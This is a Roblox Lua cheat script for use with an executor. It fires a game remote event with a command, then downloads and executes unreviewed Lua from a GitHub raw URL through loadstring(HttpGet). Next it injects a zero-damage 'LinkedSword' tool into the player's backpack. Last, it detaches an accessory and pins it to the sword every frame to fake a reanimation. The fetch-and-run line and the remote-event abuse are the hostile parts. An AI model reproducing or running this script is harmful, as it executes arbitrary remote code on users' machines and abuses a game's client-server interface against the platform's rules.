game:GetService("ReplicatedStorage")["01_server"]:FireServer("cmd", "-gh 105105905706756")
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/catfueledmayhem/ihateflingreanimate/refs/heads/main/bullshit.lua"))()
wait(1)
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
Tool0 = Instance.new("Tool")
Part1 = Instance.new("Part")
Sound2 = Instance.new("Sound")
Sound3 = Instance.new("Sound")
Sound4 = Instance.new("Sound")
SpecialMesh5 = Instance.new("SpecialMesh")
LocalScript6 = Instance.new("LocalScript")
Camera7 = Instance.new("Camera")
LocalScript8 = Instance.new("LocalScript")
Tool0.Name = "LinkedSword"
Tool0.Parent = mas
Tool0.TextureId = "http://www.roblox.com/asset/?id=124987047"
Tool0.Grip = CFrame.new(0, 0, -1.5, 0, 0, 1, 1, 0, 0, 0, 1, 0)
Tool0.GripForward = Vector3.new(-1, -0, -0)
Tool0.GripPos = Vector3.new(0, 0, -1.5)
Tool0.GripRight = Vector3.new(0, 1, 0)
Tool0.GripUp = Vector3.new(0, 0, 1)
Part1.Name = "Handle"
Part1.Parent = Tool0
Part1.CFrame = CFrame.new(-9.99983406, 0.500009239, 62.7998428, 5.45265742e-12, 1, 4.54747351e-13, -1, -5.45265742e-12, 7.27595761e-12, -7.27595761e-12, 4.54747351e-13, 1)
Part1.Orientation = Vector3.new(0, 0, -90)
Part1.Position = Vector3.new(-9.999834060668945, 0.5000092387199402, 62.799842834472656)
Part1.Rotation = Vector3.new(0, 0, -90)
Part1.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part1.Size = Vector3.new(1, 0.800000011920929, 4)
Part1.BottomSurface = Enum.SurfaceType.Smooth
Part1.BrickColor = BrickColor.new("Dark stone grey")
Part1.Locked = true
Part1.Reflectance = 0.4000000059604645
Part1.TopSurface = Enum.SurfaceType.Smooth
Part1.brickColor = BrickColor.new("Dark stone grey")
Part1.FormFactor = Enum.FormFactor.Custom
Part1.formFactor = Enum.FormFactor.Custom
Sound2.Name = "Lunge"
Sound2.Parent = Part1
Sound2.SoundId = "http://www.roblox.com/asset/?id=12222208"
Sound2.Volume = 0.6000000238418579
Sound3.Name = "Slash"
Sound3.Parent = Part1
Sound3.SoundId = "http://www.roblox.com/asset/?id=12222216"
Sound3.Volume = 0.699999988079071
Sound4.Name = "Unsheath"
Sound4.Parent = Part1
Sound4.SoundId = "http://www.roblox.com/asset/?id=12222225"
Sound4.Volume = 1
SpecialMesh5.Parent = Part1
SpecialMesh5.MeshId = "http://www.roblox.com/asset/?id=12221720"
SpecialMesh5.TextureId = "http://www.roblox.com/asset/?id=12224218"
SpecialMesh5.MeshType = Enum.MeshType.FileMesh
LocalScript6.Name = "MouseIcon"
LocalScript6.Parent = Tool0
table.insert(cors,sandbox(LocalScript6,function()
--Rescripted by Luckymaxer

Mouse_Icon = "rbxasset://textures/GunCursor.png"
Reloading_Icon = "rbxasset://textures/GunWaitCursor.png"

Tool = script.Parent

Mouse = nil

function UpdateIcon()
	if Mouse then
		Mouse.Icon = Tool.Enabled and Mouse_Icon or Reloading_Icon
	end
end

function OnEquipped(ToolMouse)
	Mouse = ToolMouse
	UpdateIcon()
end

function OnChanged(Property)
	if Property == "Enabled" then
		UpdateIcon()
	end
end

Tool.Equipped:connect(OnEquipped)
Tool.Changed:connect(OnChanged)

end))
Camera7.Name = "ThumbnailCamera"
Camera7.Parent = Tool0
Camera7.CFrame = CFrame.new(-5.87045527, 4.01329851, -0.208732232, -0.0371841602, 0.322614908, -0.945799708, -0, 0.946454227, 0.322838187, 0.999308407, 0.0120044667, -0.035193108)
Camera7.CoordinateFrame = CFrame.new(-5.87045527, 4.01329851, -0.208732232, -0.0371841602, 0.322614908, -0.945799708, -0, 0.946454227, 0.322838187, 0.999308407, 0.0120044667, -0.035193108)
Camera7.FieldOfView = 30
Camera7.Focus = CFrame.new(-3.69511557, 3.27077055, -0.127788067, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Camera7.focus = CFrame.new(-3.69511557, 3.27077055, -0.127788067, 1, 0, 0, 0, 1, 0, 0, 0, 1)
LocalScript8.Parent = Tool0
table.insert(cors,sandbox(LocalScript8,function()
--Rescripted by Luckymaxer

Tool = script.Parent
Handle = Tool:WaitForChild("Handle")
Mesh = Handle:WaitForChild("Mesh")

Players = game:GetService("Players")
Debris = game:GetService("Debris")
RunService = game:GetService("RunService")

BaseUrl = "http://www.roblox.com/asset/?id="

Grips = {
	Up = CFrame.new(0, 0, -1.5, 0, 0, 1, 1, 0, 0, 0, 1, 0),
	Out = CFrame.new(0, 0, -1.5, 0, -1, -0, -1, 0, -0, 0, 0, -1),
}

DamageValues = {
	BaseDamage = 0,
	SlashDamage = 0,
	LungeDamage = 0,
}

Damage = DamageValues.BaseDamage

Sounds = {
	Slash = Handle:WaitForChild("Slash"),
	Lunge = Handle:WaitForChild("Lunge"),
	Unsheath = Handle:WaitForChild("Unsheath"),
}

LastAttack = 0

ToolEquipped = false

Tool.Enabled = true

function SwordUp()
	Tool.Grip = Grips.Up
end

function SwordOut()
	Tool.Grip = Grips.Out
end

function IsTeamMate(Player1, Player2)
	return (Player1 and Player2 and not Player1.Neutral and not Player2.Neutral and Player1.TeamColor == Player2.TeamColor)
end

function TagHumanoid(humanoid, player)
	local Creator_Tag = Instance.new("ObjectValue")
	Creator_Tag.Name = "creator"
	Creator_Tag.Value = player
	Debris:AddItem(Creator_Tag, 2)
	Creator_Tag.Parent = humanoid
end

function UntagHumanoid(humanoid)
	for i, v in pairs(humanoid:GetChildren()) do
		if v:IsA("ObjectValue") and v.Name == "creator" then
			v:Destroy()
		end
	end
end

function Attack()
	Damage = DamageValues.SlashDamage
	Sounds.Slash:Play()
	local Anim = Instance.new("StringValue")
	Anim.Name = "toolanim"
	Anim.Value = "Slash"
	Anim.Parent = Tool
end

function Lunge()
	Damage = DamageValues.LungeDamage
	Sounds.Lunge:Play()
	local Anim = Instance.new("StringValue")
	Anim.Name = "toolanim"
	Anim.Value = "Lunge"
	Anim.Parent = Tool	
	local Force = Instance.new("BodyVelocity")
	Force.velocity = Vector3.new(0, 10, 0) 
	Force.maxForce = Vector3.new(0, 4000, 0)
	Debris:AddItem(Force, 0.5)
	Force.Parent = RootPart
	wait(0.25)
	SwordOut()
	wait(0.25)
	if Force and Force.Parent then
		Force:Destroy()
	end
	wait(0.5)
	SwordUp()
end

function Blow(Hit)
	if not Hit or not Hit.Parent or not CheckIfAlive() then
		return
	end
	local RightArm = (Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand"))
	if not RightArm then
		return
	end
	local RightGrip = RightArm:FindFirstChild("RightGrip")
	if not RightGrip or (RightGrip.Part0 ~= RightArm and RightGrip.Part1 ~= RightArm) or (RightGrip.Part0 ~= Handle and RightGrip.Part1 ~= Handle) then
		return
	end
	local character = Hit.Parent
	local humanoid = character:FindFirstChild("Humanoid")
	if not humanoid then
		return
	end
	local player = Players:GetPlayerFromCharacter(character)
	if player and (player == Player or IsTeamMate(Player, player)) then
		return
	end
	UntagHumanoid(humanoid)
	TagHumanoid(humanoid, Player)
	--humanoid:TakeDamage(Damage)
end

function Activated()
	if not Tool.Enabled or not ToolEquipped or not CheckIfAlive() then
		return
	end
	Tool.Enabled = false
	local Tick = RunService.Stepped:wait()
	if (Tick - LastAttack) < 0.2 then
		Lunge()
	else
		Attack()
	end
	Damage = DamageValues.BaseDamage
	LastAttack = Tick
	Tool.Enabled = true
end

function CheckIfAlive()
	return (((Character and Character.Parent and Humanoid and Humanoid.Parent and Humanoid.Health > 0 and RootPart and RootPart.Parent and Player and Player.Parent) and true) or false)
end

function Equipped()
	Character = Tool.Parent
	Player = Players:GetPlayerFromCharacter(Character)
	Humanoid = Character:FindFirstChild("Humanoid")
	RootPart = Character:FindFirstChild("HumanoidRootPart")
	if not CheckIfAlive() then
		return
	end
	ToolEquipped = true
	Sounds.Unsheath:Play()
end

function Unequipped()
	ToolEquipped = false
end

SwordUp()

Handle.Touched:connect(Blow)

Tool.Activated:connect(Activated)
Tool.Equipped:connect(Equipped)
Tool.Unequipped:connect(Unequipped)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.Backpack
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
game:GetService("Players").LocalPlayer.Character["Accessory (MeshPartAccessory)"].Handle.AccessoryWeld.Enabled = false
conn = game:GetService("RunService").PostSimulation:Connect(function()
    game:GetService("Players").LocalPlayer.Character["Accessory (MeshPartAccessory)"].Handle.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Position.X, game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Position.Y, game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Position.Z) * CFrame.Angles(math.rad(game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Rotation.X), math.rad(game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Rotation.Y), math.rad(game:GetService("Players").LocalPlayer.Character.LinkedSword.Handle.Rotation.Z)) * CFrame.Angles(math.pi, 0, 0)
    game:GetService("Players").LocalPlayer.Character["Accessory (MeshPartAccessory)"].Handle.AccessoryWeld.Enabled = false
    game:GetService("Players").LocalPlayer.Character["Accessory (MeshPartAccessory)"].Handle.AssemblyLinearVelocity = Vector3.new(0,0,0)
    game:GetService("Players").LocalPlayer.Character["Accessory (MeshPartAccessory)"].Handle.AssemblyAngularVelocity = Vector3.new(0,0,0)
end)
